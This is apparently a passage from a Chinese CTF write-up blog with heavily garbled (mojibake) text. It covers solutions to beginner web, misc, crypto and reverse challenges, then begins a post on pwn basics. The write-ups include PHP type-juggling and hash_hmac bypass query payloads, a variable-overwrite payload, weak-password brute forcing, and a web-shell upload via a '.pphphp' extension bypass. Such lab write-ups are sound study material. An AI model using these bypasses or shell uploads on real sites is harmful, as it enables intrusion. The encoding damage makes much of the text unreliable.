bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0docFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowed&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklUm1SWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUblJXYTFwUFZsZFNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;asdfiohaefho;$_ &#x3D; preg_replace(&quot;&#x2F;c#%bbuh;!_&amp;%ls@asc%bbzfd&#x2F;s&quot;, &#39;p&#39;, $_);$_ &#x3D; preg_replace(&quot;&#x2F;lhuh;!_&amp;%l@das%dbuioowed&#x2F;s&quot;, &#39;h&#39;, $_);$_ &#x3D; preg_replace(&quot;&#x2F;&amp;\\)buh;!_&amp;%l@as%bagsdepkl&#x2F;s&quot;, &#39;p&#39;, $_);$__ &#x3D; explode(&quot;\\n&quot;, $_);echo count($__);foreach ($__ as $____ &#x3D;&gt; $_____) &#123; for($_qpalzmxncbvsjdhfgryeuwi&#x3D;0;$_qpalzmxncbvsjdhfgryeuwi&lt;10;$_qpalzmxncbvsjdhfgryeuwi++) &#123;$_____ &#x3D; base64_decode($_____); &#125; &#125;highlight_file(__FILE__);?&gt; çœ‹åˆ°å¥½åƒè¿˜æ˜¯å¾ˆä¹±å¾ˆå¤šï¼Œå…¶å®ä»”ç»†ä¸€çœ‹ä¹ŸæŒºç®€å•çš„ï¼Œå°±æ˜¯å¯¹ä¸€å¤§ä¸²å­—ç¬¦ä¸²å¤„ç† æœ¬åœ°æµ‹è¯•ä¸€ä¸‹è®©å®ƒè¾“å‡ºå˜é‡è¯•è¯•ï¼Œå‘ç°åªæœ‰æ”¾åˆ°ä¸‹å›¾è¿™æ ·æ‰ä¼šè¾“å‡ºå°‘é‡ä¸œè¥¿ï¼Œå…¶å®ƒå¥½åƒéƒ½ä¸å¤ªåƒflag è¿™ä¸ªåƒä¸åƒå¸¸è§çš„ç½®æ¢å¯†ç ï¼Œè¯•äº†è¯•æ˜¯ROT13åŠ å¯† flag&#123;php_is_the_best_language&#125; Hi~WALLEæ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š dirseachä¸€æ‰«ï¼Œå‘ç°robots.txt è®¿é—®ä¸€çœ‹ï¼Œæœ‰ä¸ªéšè—ç›®å½•ï¼Œ/easy_challenge/web/dropsec/shell è®¿é—®éšè—ç›®å½•ï¼Œæç¤ºflagä¸åœ¨è¿™é‡Œ ç”¨å·¥å…·å†æ‰«ä¸€ä¸‹è¿™ä¸ªç›®å½•å§ï¼Œæœ‰ä¸ªshell.php,è®¿é—®å‡ºç°ç‚¹æˆ‘æœ‰æƒŠå–œæç¤ºï¼Œæ–¹å‘å¥½åƒå¯¹äº†ï¼Œå†ç‚¹å¼€ï¼Œæœ€å‘çˆ¹çš„åœ°æ–¹æ¥äº†ï¼Œä¹Ÿæ˜¯è¿™ä¸ªåœ°æ–¹è®©æˆ‘çŸ¥é“ä¸ºå•¥æœ‰ä»£æ‰“å‡ºé¢˜äººä¸šåŠ¡äº†ï¼Œä¸€æŠŠå¿ƒé…¸æ³ªå•Š ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°æœ‰ä»€ä¹ˆä¸åŒæ²¡ï¼Ÿ dr0psec drOpsec ä¸€ä¸ªæ˜¯0ï¼Œä¸€ä¸ªæ˜¯O,å®ƒè®©æˆ‘ä»¬ä¼ ä¸€ä¸ªå‚æ•°ï¼Œåˆšå¼€å§‹ä¸€ç›´æ˜¯Urlä¸Šé‚£ä¸ªå‚æ•°ï¼Œä¸€ç›´æ²¡è¿›å±• æ¢æˆdr0psecéšä¾¿è¾“ä¸ª1ï¼Œå‘ç°æç¤ºtoo small,è¾“ä¸ª10000 æç¤ºtoo big å¾ˆæ˜æ˜¾bpçˆ†ç ´å°±è¡Œï¼Œå½“=2333æ—¶æœ‰flag flag&#123;l0ve_walle_robots&#125; easy audit1æ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &quot;flag.php&quot;;error_reporting(0);if(empty($_GET)) &#123; highlight_file(__FILE__); die(&quot;get get get get args&quot;);&#125;$a1&#x3D;$_GET[&#39;a1&#39;];$a2&#x3D;$_GET[&#39;a2&#39;];$a3&#x3D;$_GET[&#39;a3&#39;];$a4&#x3D;$_GET[&#39;a4&#39;];$obstacle_1&#x3D;is_numeric($a2) and is_numeric($a1);if(!$obstacle_1) exit(&quot;foolish&quot;);if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);if(isset($a1))&#123; $secret&#x3D;hash_hmac(&#39;sha256&#39;,$a1,$secret);&#125;$hmac&#x3D;hash_hmac(sha256,$a2,$secret);if($a3!&#x3D;&#x3D;$hmac)&#123; die(&quot;OMG&quot;);&#125;echo &quot;give you flag: &quot;.$flag;?&gt;get get get get args æ˜¾ç„¶æ˜¯ä¸€é“ä»£ç å®¡è®¡é¢˜ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ€æ ·ç»•è¿‡ è§‚å¯Ÿé¢˜ç›®å‘ç°å¯ä»¥ä¼ 4ä¸ªå‚æ•°ï¼ŒGETæ–¹å¼ å¹¶ä¸”a1,a2è¦ä¸ºæ•°å­— å¦‚æœæœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­çš„æ—¶å€™ç”¨andè¿æ¥èµ·æ¥ï¼Œandåé¢çš„is_numbericåˆ¤æ–­å¯å¿½ç•¥ è¿˜è¦intval($a2)&lt;1024 and intval($a2+1)&gt;1024ï¼Œè¿™é‡Œçš„intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œå¯ä»¥ç”¨16è¿›åˆ¶æˆ–è€…ç§‘å­¦è®°æ•°æ³•è¿›è¡Œç»•è¿‡ intval(å­—ç¬¦ä¸²)ä¸º0ï¼Œintval(å­—ç¬¦ä¸²+1) ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼çš„ï¼Œäº‹å®ä¸Šæ˜¯å­—ç¬¦ä¸²å’Œæ•°å­—è¿ç®—æ—¶å‘ç”Ÿäº†è½¬æ¢ 12345678&lt;?php$a2&#x3D;&#39;1e9&#39;;echo intval($a2);#è¾“å‡º1echo &quot;\\n&quot;;echo intval($a2+1);#è¾“å‡º100000001echo &quot;\\n&quot;;echo $a2+1;#è¾“å‡º100000001?&gt; hash_hmac()å‡½æ•°æ˜¯ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼ï¼Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœä¼ å…¥åŠ å¯†çš„å­—ç¬¦ä¸²ä¸ºæ•°ç»„ï¼Œå‡½æ•°å°†è¿”å›ç©ºå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥é€šè¿‡æ§åˆ¶a1çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è®©$secretä¸ºç©ºï¼Œé‚£ä¹ˆ$hmacå°±å¯ä»¥æ§åˆ¶äº† cmdæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ç®—ä¸‹$a2ç”¨sha256ç®—æ³•åŠ å¯†åçš„ç»“æœï¼Œè¿™é‡Œ$a2å–1e5,æ³¨æ„$a2è¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå³åŠ ä¸Šå•å¼•å·æˆ–åŒå¼•å· e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6 payload1: ?a1[]=1&amp;a2=1e5&amp;a3=e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6 å½“ç„¶a1ä¹Ÿå¯ä»¥ä¸ä¸ºæ•°ç»„ payload2: ?a1=1&amp;a2=1e5&amp;a3=4dd2fa37e9fe33eccec13b3adcfc9c0d86e074c8e369d9d9d9db00a2c0c75ca3 flag&#123;didhfahffdjhcj38ash8y&#125; easy audit2æ‰“å¼€é¢˜ç›®åˆæ˜¯é“ä»£ç å®¡è®¡é¢˜ï¼š 123456789101112131415161718192021222324252627&lt;?phpinclude(&#39;flag.php&#39;);$flag &#x3D; &#39;xxxxxxxxxxxxxx&#39;;foreach ($_POST as $key &#x3D;&gt; $value) &#123; $a &#x3D; $value; $$$key&#x3D;$value; $ccut &#x3D; $flag; $yml &#x3D; $_GET[&quot;flag&quot;]; if ($yml &#x3D;&#x3D; &quot;iwantflag&quot;) &#123; if ($ccut &#x3D;&#x3D; &quot;flag&quot;) &#123; echo $fl4g; &#125; else &#123; echo &quot;you will get it&quot;; &#125; &#125; else &#123; echo &quot;nonono&quot;; &#125; # code...&#125;highlight_file(__FILE__); ?&gt; ä»”ç»†çœ‹çœ‹ï¼Œè¿™é“é¢˜çš„æ„æ€å°±æ˜¯æŠŠPOSTè¿‡æ¥çš„æ•°ç»„é”®å€¼éå†ï¼ŒGETæ¥æ”¶ä¸€ä¸ªflagçš„å‚æ•° è¾“å‡ºflagçš„æ–¹å¼å°±æ˜¯è®©GETæ–¹å¼æäº¤çš„å‚æ•°flagä¸ºâ€™iwantflagâ€™ï¼Œ$ccutä¸ºâ€™flagâ€™,è€Œ$ccut = $flag,æ‰€ä»¥å°±è½¬å˜æˆè®©$flag=â€™flagâ€™çš„é—®é¢˜äº†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸ç»•å¼¯äº†ï¼Œé¦–å…ˆè¦äº†è§£phpå¯å˜å˜é‡çš„æ¦‚å¿µ,å…·ä½“ç™¾åº¦ payloadï¼š GET:?flag=iwantflag POST:a=flag è§£é‡Šä¸€ä¸‹ï¼Œå½“POSTè¿‡å»a=flagæ—¶$key=â€™aâ€™,$value=â€™flagâ€™,åˆå› ä¸º$a = $valueï¼Œåˆ™$a=â€™flagâ€™,$$$key=$$a=$flag=$value=â€™flagâ€™,æ„é€ æˆåŠŸ flag&#123;Varivables-are-covered-MX&#125; loginloginæ‹¿åˆ°é¢˜ç›®æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼š bpæŠ“åŒ…ï¼Œçœ‹åˆ°è¿™ä¸ªæç¤ºï¼Œæ„æ€æ˜¯è¯´åˆå§‹è´¦å·å¯†ç åˆ†åˆ«ä¸ºdropsec_adminï¼Œ123456 å°è¯•ç”¨è¿™ä¸ªç™»é™†ï¼Œå‘ç°æ ¹æœ¬æ²¡ååº”ï¼Œç”±æ­¤æˆ‘ä»¬æƒ³å¯èƒ½æ˜¯ä¸ªå‡çš„ç™»é™†é¡µé¢ï¼Œdirsearchæ‰«ä¸‹å§ï¼Œå‘ç°äº†login.php,è®¿é—®ä¸€ä¸‹ï¼Œæ˜¯ä¸ªGETæ–¹å¼çš„ç™»é™†ï¼Œæ„Ÿè§‰å¥½lowï¼Œå°è¯•ç”¨é»˜è®¤è´¦å·å¯†ç ç™»é™†ï¼Œæç¤ºlogin failedï¼Œbpçˆ†ç ´ä¸€ä¸‹å¼±å£ä»¤å§,ç®¡ç†å‘˜è´¦å·åº”è¯¥ä¸ä¼šæ”¹ï¼Œè¿™é‡Œé€‰æ‹©passwordè¿™ä¸ªå­—å…¸ å¯†ç ä¸ºADMIN ç™»é™†è¿›å»å‘ç°å¥½åƒåˆå˜æˆè€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ äº†ï¼Œå¹¶ä¸”æç¤ºåªèƒ½ä¸Šä¼ jpgæ–‡ä»¶ å…ˆä¸Šä¼ ä¸ªä¸€å¥è¯è¯•è¯•ï¼ŒbpæŠ“ä¸‹åŒ…ï¼Œæ”¹ä¸‹MIME(Content-Type) å‘ç°æç¤ºï¼šæœåŠ¡å™¨æŠŠphpæ‰©å±•åæ›¿æ¢æˆç©ºäº† æˆ‘ä»¬æƒ³åˆ°åŒå†™ç»•è¿‡ï¼Œç›´æ¥å†bpé‡Œæ”¹ï¼Œæ³¨æ„phpåŒå†™ç»•è¿‡åªæœ‰.pphphpä¸€ç§æ–¹å¼ flag&#123;dont_do_things_carelessly&#125; ji ni tai mei!å‘ç°ä¸Šæ¬¡æ–°ç”Ÿèµ›çš„é¢˜è¿˜æ²¡åˆ é™¤ï¼Œå°±å†™ä¸€ä¸‹wpå§ æ‰“å¼€é¢˜ç›®æ˜¯è¿™æ ·çš„ bpæŠ“åŒ…çœ‹ä¸‹å§ï¼Œå¥½åƒæ²¡ä»€ä¹ˆæç¤ºï¼Œdirseachæ‰«ä¸‹ï¼Œå‘ç°æœ‰ä¸ªindex.php,ä½†æ˜¯è·³è½¬åˆ°flag1.phpäº†ï¼Œå†æŠ“åŒ…æ¥çœ‹ä¸‹å§ å‘ç°æç¤ºï¼šflag200.phpï¼Œè®¿é—®ä¸‹å‘ç°è¿˜æ˜¯å’Œflag1.phpä¸€æ ·ï¼Œè¯•ç€kï¼Œå‘ç°å°±403äº†ï¼Œè€Œ200ä¹‹å‰çš„å¥½åƒéƒ½å­˜åœ¨ï¼Œbpçˆ†ç ´ä¸€ä¸‹å§ flag157.phpçš„é•¿åº¦æ˜¾ç„¶ä¸åŒï¼Œçœ‹ä¸‹å“åº”å¤´ï¼Œflagåˆ°æ‰‹ flag&#123;really_beaut1ful~&#125; MISCThe Wonderful WizardStegsolveæ‰“å¼€ï¼Œåˆ‡æ¢ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°flag,æ˜¯16è¿›åˆ¶çš„è½¬æˆå­—ç¬¦å°±è¡Œ easy imageæ‰«æäºŒç»´ç  ç¥å¥‡çš„å‹ç¼©åŒ…æœ¬é¢˜æºè‡ªbugkuæ‚é¡¹ç¥ç§˜çš„æ–‡ä»¶ï¼Œåšé¢˜æ–¹æ³•æ˜¯æ˜æ–‡æ”»å‡» è§£å‹é¢˜ç›®ï¼Œå‘ç°æœ‰flag.zipå’Œlogo.pngä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”flag.zipæ˜¯åŠ å¯†çš„ï¼Œé‡Œé¢æœ‰ä¹Ÿæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªdocxæ–‡ä»¶å’Œlogo.png è¿™æ—¶æˆ‘ä»¬æƒ³åˆ°äº†æ˜æ–‡æ”»å‡»ï¼Œå°†logo.pngæ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶ï¼Œç„¶åå°±ç”¨åˆ°ARCHPRäº†ï¼Œæ³¨æ„ï¼Œè¯·æ³¨æ„CRCä¸€å®šè¦ç›¸åŒæ‰èƒ½ç”¨ARCHPRæ˜æ–‡æ”»å‡»ï¼Œå¦åˆ™ä¼šæŠ¥é”™(ç¬¬äºŒå¼ å›¾)ï¼š çˆ†ç ´ç»“æœå‡ºæ¥ è¾“å…¥å£ä»¤è§£å‹ï¼Œå°†docxæ–‡ä»¶æ‹–åˆ°è™šæ‹Ÿæœºbinwalkåˆ†ç¦»ä¸€ä¸‹ï¼Œå¾—åˆ°flag.txt,base64è§£ç å¾—åˆ°flag flag&#123;d0cX_1s_ziP_file&#125; æ”¾æ¾ä¸€ä¸‹æ‘©æ–¯ç”µç  REVERSEreverse2ç”¨uncompyle6åç¼–è¯‘.pyæ–‡ä»¶ï¼Œæ”¹ä¸‹æºç  CRYPTOWelcomeascciç è½¬å­—ç¬¦ Alphabetç™¾åº¦ä¸€ä¸‹æ˜¯å­—æ¯è¡¨çš„æ„æ€ï¼Œæ‰“å¼€ä¹‹åæ˜¯è¿™æ ·çš„ï¼š æˆ‘ä»¬å¯ä»¥æƒ³åˆ°å‰é¢çš„Alphabetåº”è¯¥ä¸æ˜¯åŠ å¯†çš„å†…å®¹ï¼Œç„¶ååé¢è·Ÿäº†ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå¯ä»¥çœ‹åˆ°æœ‰{}è¿™ä¸¤ä¸ªç¬¦å·ï¼Œå‰é¢ä¸€ä¸²æ˜¯å¤§å†™å­—æ¯ï¼Œåé¢æ˜¯å°å†™å­æ¯ï¼Œå¹¶ä¸”{å‰çš„å°å†™å­—æ¯åˆšå¥½æ˜¯å››ä¸ªï¼Œå¤§å†™å­—æ¯åˆšä¸º26ä¸ª ä¸æ‰¯äº†ï¼Œè¿™é¢˜çš„è§£æ³•å°±æ˜¯å‰é¢çš„26å¤§å†™å­—æ¯ï¼Œåˆ†åˆ«å¯¹åº”ç€å­—æ¯è¡¨çš„26ä¸ªå­—æ¯ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ‰¾åˆ°åé¢çš„ä¸€ä¸²å°å†™å­—æ¯åœ¨å‰é¢å¤§å†™å­—æ¯çš„åºå·ï¼Œå’ŒçœŸå®çš„å­—æ¯è¡¨ä¸€ä¸€å¯¹åº”å°±å¯ä»¥å¾—åˆ°flag,å¥‰ä¸Šè§£å¯†è„šæœ¬ 12345678910tr&#x3D;&quot;WCGPSUHRAQYKFDLZOJNXMVEBT&quot;secert&#x3D;&quot;ukwh&#123;ljwdhsqmags&#125;&quot;flag&#x3D;&quot;&quot;for s in secert: if s!&#x3D;&quot;&#123;&quot; and s!&#x3D;&quot;&#125;&quot;: num&#x3D;tr.index(s.upper()) flag+&#x3D;chr(num+ord(&quot;a&quot;)) else: flag+&#x3D;sprint(flag) flagä¹Ÿå¥‰ä¸Š flag&#123;orangejuice&#125; å¯Œå¼ºæ°‘ä¸»ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£ç  babyâ€™s baby rsaM=Cd%n å¥—å…¬å¼","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"}]},{"title":"pwnå…¥é—¨åŸºæœ¬çŸ¥è¯†","slug":"pwn-base","date":"2019-07-22T13:33:29.000Z","updated":"2019-10-17T05:55:22.107Z","comments":true,"path":"2019/07/22/pwn-base/","link":"","permalink":"http://www.m00nback.xyz/2019/07/22/pwn-base/","excerpt":"æœ¬ç¯‡åšå®¢è®°å½•äº†å­¦ä¹ pwnå…¥é—¨çš„ä¸€äº›ä¸œè¥¿ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§æ¦‚å¿µå’Œå¸¸è§æ¼æ´åŠåˆ©ç”¨æ–¹æ³•","text":"æœ¬ç¯‡åšå®¢è®°å½•äº†å­¦ä¹ pwnå…¥é—¨çš„ä¸€äº›ä¸œè¥¿ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§æ¦‚å¿µå’Œå¸¸è§æ¼æ´åŠåˆ©ç”¨æ–¹æ³• ä¸€äº›æ¦‚å¿µæ–‡ä»¶æ®µï¼šbssæ®µï¼šï¼ˆæœªæ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰å¹¶ä¸ç»™è¯¥æ®µçš„æ•°æ®åˆ†é…ç©ºé—´ï¼Œåªæ˜¯è®°å½•æ•°æ®æ‰€éœ€ç©ºé—´çš„å¤§å° dataæ®µï¼šï¼ˆå·²æ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰æ®µåˆ™ä¸ºæ•°æ®åˆ†é…ç©ºé—´ï¼Œæ•°æ®ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ textæ®µï¼šä»£ç æ®µï¼ˆcode segment/text segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚è¿™éƒ¨åˆ†åŒºåŸŸçš„å¤§å°åœ¨ç¨‹åºè¿è¡Œå‰å°±å·²ç»ç¡®å®šï¼Œå¹¶ä¸”å†…å­˜åŒºåŸŸé€šå¸¸å±äºåªè¯»(æŸäº›æ¶æ„ä¹Ÿå…è®¸ä»£ç æ®µä¸ºå¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åº)ã€‚åœ¨ä»£ç æ®µä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½åŒ…å«ä¸€äº›åªè¯»çš„å¸¸æ•°å˜é‡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²å¸¸é‡ç­‰ å †ï¼ˆheapï¼‰ï¼š å †æ˜¯ç”¨äºå­˜æ”¾è¿›ç¨‹è¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå®ƒçš„å¤§å°å¹¶ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚ 